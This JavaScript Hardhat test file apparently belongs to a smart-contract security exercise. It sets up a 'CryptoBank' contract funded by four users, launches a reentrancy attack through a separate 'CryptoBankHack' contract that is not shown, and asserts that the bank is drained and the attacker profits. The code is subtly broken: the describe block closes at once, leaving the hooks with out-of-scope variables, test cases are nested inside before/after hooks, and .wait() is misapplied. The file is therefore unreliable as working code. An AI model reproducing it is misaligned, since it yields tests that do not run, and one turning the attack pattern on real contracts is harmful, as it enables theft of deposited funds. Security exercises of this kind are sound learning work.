// Importing necessary libraries and dependencies for the test suite
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Crypto Bank Reentrancy Testing Suite", function () {
  // Define the addresses for deployer, users, and attacker
  let deployer, user1, user2, user3, user4, attacker;

  // User deposits are set to fixed ether amounts to initialize the state of the smart contract
  let USER1_DEPOSIT = ethers.utils.parseEther("15");
  let USER2_DEPOSIT = ethers.utils.parseEther("5");
  let USER3_DEPOSIT = ethers.utils.parseEther("30");
  let USER4_DEPOSIT = ethers.utils.parseEther("50");
  let REENTRANCY_AMOUNT = ethers.utils.parseEther("1"); // Attack amount defined for the reentrancy attack scenario
});
before(async function () {
  // Fetching the signers from the ethers library; these represent the addresses involved in the test
  [deployer, user1, user2, user3, user4, attacker] = await ethers.getSigners();

  // Getting the contract factory for CryptoBank
  const CryptoBankFactory = await ethers.getContractFactory(
    "./CryptoBank.sol:CryptoBank",
    deployer
  );

  // Deploying the CryptoBank contract using the deployer's address
  this.bank = await CryptoBankFactory.deploy();

  // Depositing ether into the bank from different user accounts
  await this.bank.connect(user1).depositETH({ value: USER1_DEPOSIT }); // User1 deposits 15 ether
  await this.bank.connect(user2).depositETH({ value: USER2_DEPOSIT }); // User2 deposits 5 ether
  await this.bank.connect(user3).depositETH({ value: USER3_DEPOSIT }); // User3 deposits 30 ether
  await this.bank.connect(user4).depositETH({ value: USER4_DEPOSIT }).wait(); // User4 deposits 50 ether

  // Storing the initial balance of the attacker and the bank for later comparison
  this.attackerInitialEthBalance = await ethers.provider.getBalance(
    attacker.address
  );
  this.bankInitialBalance = await ethers.provider.getBalance(this.bank.address);

  // [Test I] Confirming that the total balance in the bank equals the sum of all user deposits
  it("[Test I] Should confirm the initial total balance in the bank", async function () {
    expect(this.bankInitialBalance).to.equal(
      USER1_DEPOSIT.add(USER2_DEPOSIT).add(USER3_DEPOSIT).add(USER4_DEPOSIT)
    );
  });
});
it("Exploit", async function () {
  // Getting the contract factory for CryptoBankHack
  const AttackFactory = await ethers.getContractFactory(
    "./CryptoBankHack.sol:CryptoBankHack",
    attacker
  );

  // Deploying the attack contract with the address of the target bank as a parameter
  this.attack = await AttackFactory.deploy(this.bank.address);

  // Initiating the attack by calling the 'attack' function from the attack contract
  // This will initiate the reentrancy exploit against the target bank
  await this.attack.attack({ value: REENTRANCY_AMOUNT });
});
after(async function () {
  // Fetching the final balance of the bank and the attacker after the attack has been executed
  let bankBalance = await ethers.provider.getBalance(this.bank.address);
  let attackerBalance = await ethers.provider.getBalance(attacker.address);

  // [Test II] Checking that the bank's balance has been drained to zero after the attack
  it("[Test II] Should confirm that the bank's balance is zero after the attack", async function () {
    expect(bankBalance).to.be.equal(0);
  });

  // [Test III] Verifying that the attacker's balance has increased by at least the amount stolen
  // Note: There may be a slight reduction due to transaction fees, thus a tolerance is added
  it("[Test III] Should confirm that the attacker's balance has increased by the stolen amount", async function () {
    expect(attackerBalance).to.be.gt(
      this.attackerInitialEthBalance
        .add(this.bankInitialBalance)
        .sub(ethers.utils.parseEther("0.2"))
    );
  });
});
